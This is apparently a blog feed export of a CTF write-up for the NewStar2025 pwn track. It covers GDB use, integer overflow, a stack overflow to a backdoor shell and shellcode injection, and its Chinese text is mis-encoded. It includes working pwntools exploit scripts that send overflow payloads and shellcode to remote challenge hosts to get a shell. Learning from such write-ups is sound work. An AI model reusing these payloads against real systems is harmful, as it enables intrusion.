<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NewStar2025 Pwn  (1æœˆå°¾æœƒå†æ›´æ–°)</title>
      <link href="/ghsc_ovo_0721/NewStar2025-Pwn-1%E6%9C%88%E5%B0%BE%E6%9C%83%E5%86%8D%E6%9B%B4%E6%96%B0/"/>
      <url>/ghsc_ovo_0721/NewStar2025-Pwn-1%E6%9C%88%E5%B0%BE%E6%9C%83%E5%86%8D%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<p>å‰è¨€ï¼Œé€™æ˜¯å°å¼Ÿç”¨ç¬¬ä¸€æ¬¡å­¸pwnï¼Œåšé¡Œç”¨æ™‚æ¯”webæ–¹å‘ç”¨å¤ªå¤šæ™‚é–“äº†ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ï¼Œå·² ç•æ‡¼</p><h1 id="Week-1"><a href="#Week-1" class="headerlink" title="Week 1"></a>Week 1</h1><br/><h2 id="1-GNU-Debugger"><a href="#1-GNU-Debugger" class="headerlink" title="1. GNU Debugger"></a>1. GNU Debugger</h2><h3 id="æŒ‡ä»¤-çœæµ"><a href="#æŒ‡ä»¤-çœæµ" class="headerlink" title="æŒ‡ä»¤(çœæµ) :"></a>æŒ‡ä»¤(çœæµ) :</h3><ul><li><pre><code>start/ r / run<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- ```</span><br><span class="line">  i (b , r)</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>b <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- ```</span><br><span class="line">  d</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>ni <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- ```</span><br><span class="line">  si</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>finish<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- ```</span><br><span class="line">  c</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>disassemble<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- ```</span><br><span class="line">  p    </span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>x <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- ```</span><br><span class="line">  set</span><br></pre></td></tr></table></figure></code></pre></li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">GNU gdb (Ubuntu 15.0.50.20240403-0ubuntu1) 15.0.50.20240403-git</span><br><span class="line">Copyright (C) 2024 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ./gdb_challenge...</span><br><span class="line"></span><br><span class="line">This GDB supports auto-downloading debuginfo from the following URLs:</span><br><span class="line">  &lt;https://debuginfod.ubuntu.com&gt;</span><br><span class="line">Enable debuginfod for this session? (y or [n]) y</span><br><span class="line">Debuginfod has been enabled.</span><br><span class="line">To make this setting permanent, add &#x27;set debuginfod enabled on&#x27; to .gdbinit.</span><br><span class="line">(No debugging symbols found in ./gdb_challenge)</span><br><span class="line"></span><br><span class="line">(gdb) r 8.147.132.32 30978</span><br><span class="line"></span><br><span class="line">Starting program: /home/ghsc/NewStar2025/gdb_challenge 8.147.132.32 30978</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">###</span><br><span class="line">å‘å¯¼åŠ å…¥äº†é˜Ÿä¼ã€‚.</span><br><span class="line"></span><br><span class="line">å‘å¯¼:</span><br><span class="line">æ¬¢è¿æ‰“å¼€PWNçš„å¤§é—¨ï¼Œæˆ‘æ˜¯å‘å¯¼ï¼Œæ¥åˆ°è¿™é‡Œçš„ç¬¬ä¸€æ¬¡è€ƒéªŒï¼Œæœ¬å…³è€ƒéªŒä½ å’Œä½ çš„æ­æ¡£GDB (GNU Debugger)çš„å¥‘åˆç¨‹åº¦ï¼Œæ¯•ç«Ÿåœ¨PWNçš„ä¸–ç•Œä¸­ç¦»å¼€äº†GDBå°±æ— æ³•ç”Ÿå­˜äº†å‘¢ã€‚ã€‚ã€‚</span><br><span class="line">å½“ç„¶äº†è®¾ç½®è¿™é“å…³å¡çš„äººæ²¡ç»™è°ƒè¯•ä¿¡æ¯ï¼Œæ‰€ä»¥åœ¨ dbg (debug) çš„è¿‡ç¨‹ä¸­ä½ æˆ–è®¸ä¼šçœ‹åˆ°ä¸€äº›æ¥è‡ªgdbçš„è¾“å‡ºæç¤ºï¼Œè¿™äº›éƒ½æ˜¯æ— å…³è¦ç´§çš„ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§</span><br><span class="line">å®Œæˆ4ä¸ªå…³å¡åå°±èƒ½å¾—åˆ°flagå’¯</span><br><span class="line">--- å…³å¡ 1: å·²éªŒä¸çœŸ ---</span><br><span class="line">å‘å¯¼:</span><br><span class="line">æˆ‘æ”¾äº†ä¸€ä¸ªéšæœºæ•°åœ¨&#x27;r12&#x27;å¯„å­˜å™¨é‡Œé¢å“¦, ä½ å¯ä»¥å€ŸåŠ©GDBçš„åŠ›é‡ä¸€çœ¼ä¸çœŸå—?</span><br><span class="line">æ‰¾åˆ°r12çš„16è¿›åˆ¶å€¼å°±æŒ‰ä¸‹c(continue)æ¥å‘Šè¯‰æˆ‘ç­”æ¡ˆå§!</span><br><span class="line"></span><br><span class="line">Program received signal SIGTRAP, Trace/breakpoint trap.</span><br><span class="line">0x0000000000400dd1 in stage_0_register_check ()</span><br><span class="line"></span><br><span class="line">(gdb)  p $r12</span><br><span class="line">$1 = 8637704899224837111</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">å‘å¯¼:</span><br><span class="line">r12å¯„å­˜å™¨é‡Œé¢è£…ç€ä»€ä¹ˆå‘¢?å¥½éš¾çŒœå•Š, è®°ä½æˆ‘è¦16è¿›åˆ¶æ•°å­—æï¼Œä¾‹å¦‚0x114ä¹‹ç±»çš„æ•°å­—:</span><br><span class="line">0x77DF4AD760F29BF7</span><br><span class="line">å‘å¯¼:</span><br><span class="line">æ­£è§£! ä¸‹ä¸€å…³å’¯</span><br><span class="line"></span><br><span class="line">--- å…³å¡ 2: ä¹‰çœ¼ä¸çœŸ ---</span><br><span class="line">å‘å¯¼:</span><br><span class="line">è¿™æ¬¡æ˜¯å†…å­˜æ, æˆ‘ç•™äº†ä¸€å¥è¯åœ¨æŸä¸ªåœ°æ–¹æ.</span><br><span class="line">å·å·å‘Šè¯‰ä½ è¿™ä¸ªåœ°æ–¹åœ¨å“ªé‡ŒQwQ -&gt; 0x402457</span><br><span class="line">çŒœçŒœæˆ‘è¦å¯¹ä½ è¯´ä»€ä¹ˆã€‚æ‰¾åˆ°äº†å°±æŒ‰ä¸‹c(continue)æ¥å‘Šè¯‰æˆ‘ç­”æ¡ˆå§!</span><br><span class="line"></span><br><span class="line">Program received signal SIGTRAP, Trace/breakpoint trap.</span><br><span class="line">0x0000000000400efa in stage_1_memory_check ()</span><br><span class="line"></span><br><span class="line">(gdb) x /s 0x402457</span><br><span class="line">0x402457:       &quot;GDB_IS_POWERFUL&quot;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">å‘å¯¼:</span><br><span class="line">ä½ æ‰¾åˆ°äº†å—QwQï¼Œå‘Šè¯‰æˆ‘ä½ æ‰¾åˆ°äº†ä»€ä¹ˆ:</span><br><span class="line">GDB_IS_POWERFUL</span><br><span class="line">å‘å¯¼:</span><br><span class="line">æ­£è§£! ä¸‹ä¸€å…³!.</span><br><span class="line"></span><br><span class="line">--- å…³å¡ 3: çŠ¹è±«ä¸çœŸ ---</span><br><span class="line">å‘å¯¼:</span><br><span class="line">å•Šï¼Œç¨‹åºä¸­æœ‰ä¸ªå‡½æ•°è·‘å¾—å¤ªå¿«äº†ï¼Œä»–çš„èº«ä¸Šæœ‰æœ€åä¸€å…³çš„é’¥åŒ™ï¼æˆ‘ä»¬è¦æŠ“ä½ä»–ï¼Œç”¨GDBè®©ä»–åœä¸‹æ¥!</span><br><span class="line">å¦‚æœæ²¡èƒ½æŠ“ä½ä»–çš„è¯ï¼Œæˆ‘ä»¬å°±æ²¡åŠæ³•ç»§ç»­å¾€å‰èµ°äº†.</span><br><span class="line">è®©ä»–åœä¸‹æ¥æ‹¿åˆ°é’¥åŒ™ä¹‹åï¼ŒæŒ‰ä¸‹ä¸€æ¬¡cæŠŠé’¥åŒ™æ‹¿è¿‡æ¥ï¼Œç„¶åå†æ¬¡æŒ‰ä¸‹cç»§ç»­æˆ‘ä»¬çš„æ—…ç¨‹å§. æ³¨æ„éœ€è¦æ…¢æ…¢æ¥ï¼Œä¸è¦æŒ‰å¾—è¿™ä¹ˆå¿«å“¦</span><br><span class="line"></span><br><span class="line">å·å·å‘Šè¯‰ä½ è¿™ä¸ªå‡½æ•°åœ¨ -&gt; 0x400fa9</span><br><span class="line"></span><br><span class="line">Program received signal SIGTRAP, Trace/breakpoint trap.</span><br><span class="line">0x0000000000401018 in stage_2_breakpoint_check ()</span><br><span class="line"></span><br><span class="line">(gdb) b *0x400fa9</span><br><span class="line">Breakpoint 1 at 0x400fa9</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000000000400fa9 in function_to_break_on ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">å‘å¯¼:</span><br><span class="line">ä»–åœä¸‹æ¥äº†! åœ¨è¿™ä¸ªå‡½æ•°èº«ä¸Šæ‰¾åˆ°äº†æœ€åä¸€å…³çš„é’¥åŒ™.</span><br><span class="line">æ¥ä¸‹æ¥æ˜¯æœ€åä¸€å…³äº†å“¦.</span><br><span class="line"></span><br><span class="line">--- å…³å¡ 4: åº”ç”¨ä¸çœŸ ---</span><br><span class="line">æ¥åˆ°æœ€åä¸€å…³äº†ï¼Œç”±äºç¯å¢ƒå½±å“ï¼Œå·²ç»å¬ä¸æ¸…æ¥šå‘å¯¼è¯´çš„è¯äº†ã€‚</span><br><span class="line">å‘å¯¼:</span><br><span class="line">æˆ‘ä»¬çš„ &#x27;(&amp;*(â€¦â€¦ï¿¥*&amp;ï¿¥#!ï¿¥&amp;â€¦â€¦*&amp;*&amp;!@ï¿¥#&#x27; ç°åœ¨åªæœ‰ 1 ä¸ª.....ä½†æ˜¯è¦è¿‡å…³çš„è¯ä¸€å…±éœ€è¦ 0xdeadbeef ä¸ª</span><br><span class="line">ä½ çŸ¥é“è‘«èŠ¦ä¾ çš„ä¼ è¯´å—ï¼Œå¥½åœ¨GDBæœ‰ä¸€ä¸ªå¼ºå¤§çš„åŠŸèƒ½ï¼Œä»–å¯ä»¥*&amp;ï¿¥&amp;@34#! æ”¹.</span><br><span class="line">åœ°$^&amp;!$å€ -&gt; 0x7fffffffd3f4 â€¦*&amp;</span><br><span class="line"></span><br><span class="line">Program received signal SIGTRAP, Trace/breakpoint trap.</span><br><span class="line">0x0000000000401157 in stage_3_state_modification ()</span><br><span class="line"></span><br><span class="line">(gdb) x /w 0x7fffffffd3f4</span><br><span class="line">0x7fffffffd3f4: U&quot;\001\x855ef600\x43dadab9\xffffd540ç¿¿\x40175d&quot;</span><br><span class="line">(gdb) set &#123;unsigned int&#125;0x7fffffffd3f4 = 0xdeadbeef</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">å‘å¯¼ç¦»å¼€äº†é˜Ÿä¼ã€‚.</span><br><span class="line"></span><br><span class="line">[*] Initializing security protocols...</span><br><span class="line">[+] ä¸–ç•Œä¸Šå³å°†å¢åŠ ä¸€ä¸ªPWNé«˜æ‰‹äº†æ</span><br><span class="line">[+] FLAG : flag&#123;de2f9a9f-bde2-4596-a3cb-2d4b1e12daa9&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-INTbug"><a href="#2-INTbug" class="headerlink" title="2.INTbug"></a>2.INTbug</h2><img src="63500c198c7371279c772f3ee12d2e0b.png" alt="screen-capture.png"  /><img src="6e59d6942a051d0ed90e2e0febb4c85f.png" alt="screen-capture.png"  /><img src="f5d69a9a80e8988d9295c9e39336f54f.png" alt="screen-capture.png"  /><p>32767 + 1 &#x3D; (1000 0000 0000 0000)2 &lt; 0 </p><img src="0363e0442e097df068c46c7afafaf77b.png" alt="screen-capture.png"  /><h2 id="3-pwnâ€™s-door"><a href="#3-pwnâ€™s-door" class="headerlink" title="3.pwnâ€™s door"></a>3.pwnâ€™s door</h2><p>é¢˜ç›®å†…å®¹ï¼š<br>Key å·²ç»ä¸ºè¿›å…¥ pwn çš„ä¸–ç•Œåšå¥½äº†å……åˆ†å‡†å¤‡ã€‚ä»–æ‰¾åˆ°äº†å¯é çš„ä¼™ä¼´ï¼ŒçŒ«çŒ« NetCat å’ŒèŸ’è›‡ Pythonï¼Œè¿˜ä¸º Python é…å¤‡äº†å¼ºå¤§çš„å·¥å…· pwntoolsã€‚æœ‰äº†è¿™äº›ï¼Œä»–ç›¸ä¿¡è‡ªå·±ä¸€å®šèƒ½é¡ºåˆ©é€šè¿‡è€ƒéªŒã€‚</p><p>ã€éš¾åº¦ï¼šç­¾åˆ°ã€‘</p><img src="bee25f94eb4e6d6af1a88974d5038158.png" alt="screen-capture.png"  /><img src="e3c701faa2516f6bafd2c3dd87f4bf6d.png" alt="screen-capture.png"  /><img src="c0f0f8b2f297cb01776afc61d3ffc52b.png" alt="screen-capture.png"  /><h2 id="4-overflow"><a href="#4-overflow" class="headerlink" title="4.overflow"></a>4.overflow</h2><p>å…ˆçœ‹çœ‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn checksec overflow</span><br></pre></td></tr></table></figure><img src="fbee7a219c5421776b5feddd0852282d.png" alt="screen-capture.png"  /><p>amd64 æ²’æœ‰NXä¿è­· (ä¸ç”¨è£œret)</p><img src="da3cfd5046664c22b384ba5f5adfa50d.png" alt="screen-capture.png"  /><br/><br/><br/><p>(åœ¨IDAæ‰¾åˆ°çš„)åé—¨ä»£ç :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl backd00r()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;Congratulations! You have found the backdoor!&quot;);</span><br><span class="line">  puts(&quot;You can now execute any command you want.&quot;);</span><br><span class="line">  system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backd00r    .text    0000000000401200    00000034    00000008        R    .    .    .    .    .    B    T    .    .</span><br></pre></td></tr></table></figure><p>åœ°å€æ˜¯0x401200 , åœ¨getå‡½æ•¸å¯ä»¥ æ§‹é€ 256+8å€‹åƒåœ¾æ•¸æ“š , ä½†æ˜¯å®ƒ%16ä¸æ•´, æœƒç™¼ç”ŸæŒ‡ä»¤ä¸</p><p>åŸ·è¡Œ , æˆ‘å€‘è¦é€²è¡Œä¸€å€‹æ£§å°é½Š , åŠ ä¸€å€‹ret +8 , 256+8+8 &#x3D; 272 , 272&#x2F;16 &#x3D; 17</p><img src="37fd4e82c90372fcab363e161eed38f1.png" alt="411d99e9-47df-42ec-8953-c9b199fbbcf4.png"  /><p>å°æ‡‰çš„æ£§æ¨£å­å¦‚ä¸‹:</p><img src="9bf0e5d9d901ce1a01a204e7866669be.jpg" alt="b5244b715f1dd7c33ee81bcc5f559b17.jpg"  /><img src="0b537ab4de0be937568a32d91f47a31f.png" alt="screen-capture.png"  /><p>å¯ä»¥çœ‹è¦‹å‰nè¡Œæ˜¯å°é½Šçš„, æœ€å¾ŒåŠ ä¸€å€‹BACKDOOR_ADDRå¤§åŠŸå‘Šæˆ</p><img src="658b3d78529d6981814e6498a2d27ad4.png" alt="38d3a8e0d50e90df18ececbbda87f714.png"  /><p>pwn!!!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#8.147.132.32 27654</span></span><br><span class="line">p = remote(<span class="string">&quot;8.147.132.32&quot;</span>,<span class="number">27654</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recvuntil(<span class="string">b&quot;Enter your input:&quot;</span>).decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BACKDOOR_ADDR = <span class="number">0x401200</span></span><br><span class="line">padding = <span class="string">b&quot;A&quot;</span> * <span class="number">264</span></span><br><span class="line">ret = p64(<span class="number">0x401342</span>)</span><br><span class="line">sys_address = p64(BACKDOOR_ADDR)  <span class="comment"># ä½¿ç”¨p64è™•ç†64ä½åœ°å€</span></span><br><span class="line">    </span><br><span class="line">payload = padding + ret + sys_address </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="dd3740c69f75b8057047b8b2559ac78c.png" alt="screen-capture.png"  /><br/><h2 id="5-input-function"><a href="#5-input-function" class="headerlink" title="5.input_function"></a>5.input_function</h2><p>å¯åƒè€ƒ<a href="https://">https://www.bilibili.com/video/BV1R8VVzjEkf?spm_id_from&#x3D;333.788.videopod.sections&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f</a></p><p>checksec ä¸€ä¸‹:</p><img src="9cbc16db596a6824706f1ea9bcbba654.png" alt="screen-capture.png"  /><p>æœ‰é–‹NX , Full RELRO ,   PIE</p><p>å› ç‚ºæ²’æœ‰å¾Œé–€å‡½æ•¸, æˆ‘å€‘å¯ä»¥ç”¨pwntoolsçš„è‡ªå¸¶å·¥å…·shellcraft.sh() ç”Ÿæˆshellcode </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># nc 47.94.87.199 37002</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">&#x27;47.94.87.199&#x27;</span>,<span class="number">37002</span>)</span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;please input a function(after compile)&quot;</span>)</span><br><span class="line">    p.sendline(shellcode)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="d4d7ec3ecc00b3752ae3f0b8b7575b73.png" alt="screen-capture.png"  /><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="1-åˆ»åœ¨æ ˆé‡Œçš„ç§˜å¯†"><a href="#1-åˆ»åœ¨æ ˆé‡Œçš„ç§˜å¯†" class="headerlink" title="1.åˆ»åœ¨æ ˆé‡Œçš„ç§˜å¯†"></a>1.åˆ»åœ¨æ ˆé‡Œçš„ç§˜å¯†</h2><p>é¢˜ç›®å†…å®¹ï¼š<br>æ¬¢è¿æ¥åˆ° x64 ä½é¤å…ï¼æœåŠ¡å‘˜ printf å…ˆç”Ÿæœ‰ç‚¹å¥å¿˜ï¼Œä»–åªèƒ½è®°ä½æ‚¨èœå•ä¸Šçš„å‰ 6 é“èœ (RDI, RSI, RDXâ€¦)ï¼Œå†å¤šå°±åªèƒ½å †åœ¨æ‘‡æ‘‡æ™ƒæ™ƒçš„é¤ç›˜ (æ ˆ) ä¸Šäº†ã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼Œä»–ä¼šæŠŠä½ å†™çš„èœå•åŸå°ä¸åŠ¨åœ°å¤§å£°å¿µå‡ºæ¥ã€‚ä½ èƒ½è®¾è®¡ä¸€ä»½åˆ«æœ‰ç”¨å¿ƒçš„èœå•ï¼Œè®©ä»–å¿µç€å¿µç€ï¼Œå°±æŠŠç§˜å¯†æˆ¿é—´çš„å¯†ç å¿µç»™ä½ å¬å—ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">ç°åœ¨æœ‰ä¸€ä¸ªå¯†ç éšè—åœ¨æ ˆä¸Š(â€¢Ì€á´—â€¢ )</span><br><span class="line">ä½ éœ€è¦åšçš„æ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥æ³„éœ²è¿™ä¸ªå¯†ç o(Â´^ï½€)oï¼m, å‘Šè¯‰æˆ‘å¯†ç æˆ‘å°±ç»™ä½ flag</span><br><span class="line">å“¦ï¼Œå¯¹äº†å¯¹äº†ï¼Œä½ è¿˜è¦å‘Šè¯‰æˆ‘æŒ‡å‘è¿™ä¸ªå¯†ç çš„åœ°å€</span><br><span class="line">åœ¨æ­¤ä¹‹å‰, ä½ å¯ä»¥äº†è§£ä¸€ä¸‹å„ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç”¨æ³•, ä¾‹å¦‚ %p, %s, %d, ä»¥åŠ $ ç¬¦å·. emmm...è¿˜æœ‰ x86-64 å‡½æ•°è°ƒç”¨çº¦å®š!</span><br><span class="line"></span><br><span class="line">æŒ‡å‘å¯†ç çš„æŒ‡é’ˆè¢«å­˜æ”¾åœ¨äº† 0x7ffc4ced3650 ä¸­, åŒæ—¶æ ˆé¡¶æŒ‡é’ˆæ˜¯ 0x7ffc4ced35d0 .</span><br><span class="line">ä»–ä»¬ä¹‹é—´çš„è·ç¦»æ˜¯:ä¹Ÿå°±æ˜¯è¯´, åœ¨printfä¹‹å‰, æ ¼å¼å­—ç¬¦ä¸²çš„å‚æ•°çœ‹èµ·æ¥å°±åƒ ( *ãƒ»Ï‰ãƒ»)</span><br><span class="line"></span><br><span class="line">0x7ffc4ced3650: [?] &lt;-- å¯†ç åœ¨è¿™é‡Œæ</span><br><span class="line">0x7ffc4ced3648: [?]</span><br><span class="line">0x7ffc4ced3640: [?]</span><br><span class="line">0x7ffc4ced3638: [?]</span><br><span class="line">0x7ffc4ced3630: [?]</span><br><span class="line">0x7ffc4ced3628: [?]</span><br><span class="line">0x7ffc4ced3620: [?]</span><br><span class="line">0x7ffc4ced3618: [?]</span><br><span class="line">0x7ffc4ced3610: [?]</span><br><span class="line">0x7ffc4ced3608: [?]</span><br><span class="line">0x7ffc4ced3600: [?]</span><br><span class="line">0x7ffc4ced35f8: [?]</span><br><span class="line">0x7ffc4ced35f0: [?]</span><br><span class="line">0x7ffc4ced35e8: [?]</span><br><span class="line">0x7ffc4ced35e0: [?]</span><br><span class="line">0x7ffc4ced35d8: [?]</span><br><span class="line">0x7ffc4ced35d0: [?]</span><br><span class="line">0x7ffc4ced35c8: [?]</span><br><span class="line">0x7ffc4ced35c0: [?] &lt;-- æ ˆé¡¶åœ¨è¿™é‡Œæ</span><br><span class="line">R9:             [?]</span><br><span class="line">R8:             [?]</span><br><span class="line">RCX:            [?]</span><br><span class="line">RDX:            [?]</span><br><span class="line">RSI:            [?]</span><br><span class="line">RDI:            [æ ¼å¼åŒ–å­—ç¬¦ä¸²]</span><br><span class="line"></span><br><span class="line">ç°åœ¨ç»™ä½ ä¸¤æ¬¡è¾“å…¥çš„æœºä¼š, è¡¥è¦è¾“å…¥å¤ªé•¿çš„æ•°æ®å“¦.</span><br><span class="line">æ¥ç€æˆ‘ä¼šä½¿ç”¨printf, ç”¨ä½ çš„è¾“å…¥ä½œä¸ºprintfçš„å‚æ•°.</span><br><span class="line">çœ‹èµ·æ¥å°±åƒ printf(your_input), å®é™…ä¸Šè¿™æ ·æ˜¯å¾ˆå±é™©çš„, å¥½å­©å­ä¸è¦æ¨¡ä»¿^^. 